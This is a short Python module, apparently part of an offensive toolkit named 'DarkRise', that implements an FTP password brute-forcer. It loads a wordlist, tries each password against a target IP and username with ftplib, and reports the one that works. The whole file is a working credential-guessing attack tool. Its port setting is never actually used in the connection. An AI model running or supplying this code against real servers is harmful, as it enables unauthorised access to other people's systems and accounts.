from core.DarkRiseSettings import DarkRiseSettings
from termcolor import colored
import ftplib
import subprocess

class FTP_Breaker(DarkRiseSettings):
    def __init__(self, username, ipaddr, port, wordlist):
        super().__init__()
        self.username = username
        self.ip = ipaddr
        self.port = port
        self.wordlist = wordlist

    def Break(self):
        _passwords = []
        try:
            with open(str(self.wordlist), 'r', encoding = 'utf-8') as wordlist:
                _passwords = [_pass.strip() for _pass in wordlist]

        except Exception:
            print("Please Check Out Your Wordlist!")

        subprocess.call("clear")
        self.logo()

        for ftpass in _passwords:
            if self.port is None:
                self.port = 21

            print(f"{self.username}@{self.ip} {self.port} : {ftpass}")
            
            try:
                ftp = ftplib.FTP(self.ip, self.username, ftpass)
                print(colored(f"Found Password: {ftpass}", "green", attrs=["bold"]))
                break
            except Exception:
                print("Authentication failed.")